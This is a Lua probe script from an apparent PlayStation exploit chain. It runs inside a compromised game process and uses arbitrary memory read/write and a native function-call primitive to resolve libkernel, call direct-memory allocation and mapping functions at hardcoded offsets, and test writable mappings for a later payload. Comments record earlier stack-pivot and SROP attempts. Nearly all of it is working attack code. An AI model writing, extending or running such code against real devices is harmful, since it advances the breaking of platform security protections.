-- CRASH_CLASS: MODERATE
-- PROBE 1526a: MapDirectMemory round trip -- does it hand back a VA we can read and write?
--
-- -- prior art:
--   probes/phase36_realargs/1525a_mapdm_length_discriminator.lua
--     results/phase36_realargs/1525a_mapdm_length_discriminator_20261110_102146.txt
--     -> DECISIVE: the probe COMPLETED. map_fn(out, 0x4000, prot 0, flags 0, phys 0,
--        align 0x4000) returned rv=0 and the process survived, where 1523b's byte-identical
--        call crashed. map_fn(out, 0xFFFFFFFFFFFFF000, ...) also returned rv=0. So the earlier
--        SIGSEGVs were not caused by the length or by the arguments -- the same call shape
--        both crashes and succeeds across runs, which points at the kernel-chosen destination
--        VA colliding with the loader's own heap (the pivot is map_fixed(pivot_base, 0x2000)
--        and the fcall chain restores r15/rsp/rip from a heap jmpbuf via longjmp).
--   probes/phase36_realargs/1522b_mapdm_fcall_offsets.lua
--     -> libkernel+0x15020 is sceKernelMapDirectMemory by behaviour: a zero-length request
--        returns Sony status 0x80020016.
--   probes/phase36_realargs/1524a_sys570_budget_get.lua -- 570 kills; 1525a's own [A2]
--     confirmed the fcall chain is healthy in this process.
--
-- Why: if the map really succeeds, *out must hold the VA, and that VA must be readable and
-- writable. Nothing in this tree has ever verified a returned direct-memory mapping from
-- inside the game process -- 528f died in the SROP frame before it could.
--
-- Safety: every arm prints before it calls, and the arms run cheapest-first. A death truncates
-- the capture at its own print line, which names the shape that killed.

-- print that reaches the socket even if the thread dies mid-probe
local function P(...)
    local parts = {}
    for i = 1, select("#", ...) do parts[#parts + 1] = tostring((select(i, ...))) end
    local line = table.concat(parts, "\t")
    pcall(function() io.write(line .. "\n") end)
    pcall(function() io.stdout:flush() end)
    pcall(function() io.flush() end)
end

P("=== PROBE 1526a: MAPDIRECTMEMORY ROUND TRIP ===")
P("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function addr_of(u)
    local n = N(u)
    if n >= 0x10000 and n < 0x8000000000 then return n end
    return nil
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v)
    return pcall(function() memory.write_dword(a, uint64(v % 4294967296)) end)
end
local function wq(a, v)
    return pcall(function() memory.write_qword(a, uint64(v)) end)
end
local function sid(v)
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return n
end
local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end
local function isva(v)
    return v and v > 0x10000 and v < 0x8000000000
end

local PID0 = self_pid()
P("pid=" .. tostring(PID0))

-- ============================================================
-- [A] libkernel and the owned direct-memory block
-- ============================================================
P("")
P("[A] resolve libkernel via 593(0x2001) and allocate 0x4000 of direct memory")
local info = memory.alloc(0x200)
local ia = addr_of(info)
if not ia then print("  FAIL: no info buffer"); return end
for off = 0, 0x160, 4 do pcall(function() memory.write_dword(ia + off, 0) end) end
pcall(function() memory.write_dword(ia, 0x160) end)
local ok593, rv593 = pcall(function() return mk(593)(uint64(0x2001), uint64(ia)) end)
if not ok593 or N(rv593) ~= 0 then print("  FAIL: 593 rv=" .. tostring(ok593 and sid(rv593) or "EXC")); return end
local KTEXT = (rd(ia + 0x10C) or 0) * 4294967296 + (rd(ia + 0x108) or 0)
if KTEXT < 0x10000 then print("  FAIL: libkernel text zero"); return end
P("  KTEXT=" .. string.format("0x%X", KTEXT))
local MK_ALLOC = KTEXT + 0x17EF0
local MK_MAP = KTEXT + 0x15020

local out = memory.alloc(0x10)
local outa = addr_of(out)
local phys = memory.alloc(0x10)
local pha = addr_of(phys)
if not outa or not pha then print("  FAIL: buffers"); return end

local function alloc_block(sz, align)
    wq(pha, 0)
    local ok, rv = pcall(function()
        return native.fcall(MK_ALLOC, uint64(0), uint64(0x150000000), uint64(sz), uint64(align), uint64(0), uint64(pha))
    end)
    if not ok then return nil, "raised" end
    local p = N(memory.read_qword(pha) or 0)
    if p == 0 then return nil, string.format("rv=0x%X", sid(rv)) end
    return p, string.format("rv=0x%X", sid(rv))
end
local PHYS, why = alloc_block(0x4000, 0x4000)
P("  phys=" .. tostring(PHYS and string.format("0x%X", PHYS) or "nil") .. "  (" .. tostring(why) .. ")")
if not PHYS then print("  FAIL: no direct memory"); return end

P("  [A2] chain health: map_fn(out, 0, 3, 0, 0, 0)")
local okA2, rvA2 = pcall(function()
    return native.fcall(MK_MAP, uint64(outa), uint64(0), uint64(3), uint64(0), uint64(0), uint64(0))
end)
P("       rv=" .. tostring(okA2 and ("0x" .. string.format("%X", sid(rvA2))) or "EXC"))
if not okA2 then print("  FAIL: chain unhealthy"); return end

-- ============================================================
-- [B] the map, with the block we own
-- ============================================================
local function try_map(tag, len, prot, flags, physaddr, align)
    print("")
    print(tag .. " map_fn(out, len=" .. string.format("0x%X", len) .. ", prot=" .. string.format("0x%X", prot) ..
          ", flags=" .. string.format("0x%X", flags) .. ", phys=" .. string.format("0x%X", physaddr) ..
          ", align=" .. string.format("0x%X", align) .. ")")
    wq(outa, 0)
    print("    calling")
    local ok, rv = pcall(function()
        return native.fcall(MK_MAP, uint64(outa), uint64(len), uint64(prot), uint64(flags), uint64(physaddr), uint64(align))
    end)
    if not ok then
        print("    EXC")
        return nil
    end
    local va = N(memory.read_qword(outa) or 0)
    print("    rv=" .. string.format("0x%X", sid(rv)) .. "  *out=" .. string.format("0x%X", va))
    return va
end

local VA = try_map("[B]", 0x4000, 3, 0, PHYS, 0x4000)

-- ============================================================
-- [C] is the returned VA real?
-- ============================================================
P("")
P("[C] probe the returned VA")
if isva(VA) then
    print("  VA=" .. string.format("0x%X", VA))
    local v0 = rd(VA)
    print("  read +0x00 = " .. tostring(v0 and string.format("%08X", v0) or "FAULT"))
    if v0 then
        print("  store 0x1234ABCD at +0x08 ...")
        wd(VA + 0x08, 0x1234ABCD)
        local v1 = rd(VA + 0x08)
        print("  read back +0x08 = " .. tostring(v1 and string.format("%08X", v1) or "FAULT") ..
              (v1 == 0x1234ABCD and "  LANDED" or "  did not land"))
        print("  store 0xDEADBEEF at +0x00 ...")
        wd(VA, 0xDEADBEEF)
        print("  read back +0x00 = " .. tostring(rd(VA) and string.format("%08X", rd(VA)) or "FAULT"))
    end
else
    print("  *out was not a plausible VA, so the map either failed or wrote nothing")
end

P("")
P("pid_after_C=" .. tostring(self_pid()))

-- ============================================================
-- [D] the payload's own prot/flags pair, on the same block
-- ============================================================
local VA2 = try_map("[D]", 0x4000, 0x33, 0x400000, PHYS, 0x4000)
if isva(VA2) then
    local v = rd(VA2)
    print("    read +0x00 = " .. tostring(v and string.format("%08X", v) or "FAULT"))
end

P("")
P("pid_after_D=" .. tostring(self_pid()))

-- ============================================================
-- [E] a larger block: 0x100000
-- ============================================================
local PHYS2 = alloc_block(0x100000, 0x100000)
P("")
P("[E] second block phys=" .. tostring(PHYS2 and string.format("0x%X", PHYS2) or "nil"))
if PHYS2 then
    local VA3 = try_map("[E]", 0x100000, 0x33, 0x400000, PHYS2, 0x100000)
    if isva(VA3) then
        local v = rd(VA3)
        print("    read +0x00 = " .. tostring(v and string.format("%08X", v) or "FAULT"))
    end
end

P("")
P("pid_final=" .. tostring(self_pid()))
P("")
P("=== PROBE 1526a COMPLETE ===")
